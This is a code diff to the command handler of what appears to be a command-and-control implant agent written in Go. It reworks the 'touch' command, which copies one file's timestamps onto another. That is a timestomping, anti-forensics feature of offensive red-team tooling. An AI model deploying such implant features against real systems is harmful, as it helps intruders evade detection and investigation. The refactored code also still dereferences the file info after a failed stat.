@@ -48,6 +48,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/lucas-clemente/quic-go"
 	"github.com/lucas-clemente/quic-go/http3"
+	"github.com/mattn/go-shellwords"
 	uuid "github.com/satori/go.uuid"
 	"golang.org/x/crypto/pbkdf2"
 	"golang.org/x/net/http2"
@@ -1012,26 +1013,28 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 				}
 			}
 		case "touch":
-			ArgsArray := strings.Fields(p.Args)
-			sourcefilename := ArgsArray[1]
-			destinationfilename := ArgsArray[2]
-
-			// get last modified time of source file
-			sourcefile, err1 := os.Stat(sourcefilename)
-
-			if err1 != nil {
-				c.Stderr = fmt.Sprintf("Error retrieving last modified time of: %s\n%s\n", sourcefilename, err1.Error())
-			}
-
-			modifiedtime := sourcefile.ModTime()
-
-			// change both atime and mtime to last modified time of source file
-			err2 := os.Chtimes(destinationfilename, modifiedtime, modifiedtime)
-
-			if err2 != nil {
-				c.Stderr = fmt.Sprintf("Error changing last modified and accessed time of: %s\n%s\n", destinationfilename, err2.Error())
+			ArgsArray, err := shellwords.Parse(p.Args)
+			if err != nil || len(ArgsArray) != 2 {
+				c.Stderr = fmt.Sprintf("Incorrect number of args. Did you mess up quotes?\n%s", p.Args)
 			} else {
-				c.Stdout = fmt.Sprintf("File: %s\nLast modified and accessed time set to: %s\n", destinationfilename, modifiedtime)
+				sourcefilename := ArgsArray[0]
+				destinationfilename := ArgsArray[1]
+
+				// get last modified time of source file
+				sourcefile, err1 := os.Stat(sourcefilename)
+				if err1 != nil {
+					c.Stderr = fmt.Sprintf("Error retrieving last modified time of: %s\n%s\n", sourcefilename, err1.Error())
+				}
+
+				modifiedtime := sourcefile.ModTime()
+
+				// change both atime and mtime to last modified time of source file
+				err2 := os.Chtimes(destinationfilename, modifiedtime, modifiedtime)
+				if err2 != nil {
+					c.Stderr = fmt.Sprintf("Error changing last modified and accessed time of: %s\n%s\n", destinationfilename, err2.Error())
+				} else {
+					c.Stdout = fmt.Sprintf("File: %s\nLast modified and accessed time set to: %s\n", destinationfilename, modifiedtime)
+				}
 			}
 		default:
 			c.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", p.Command)
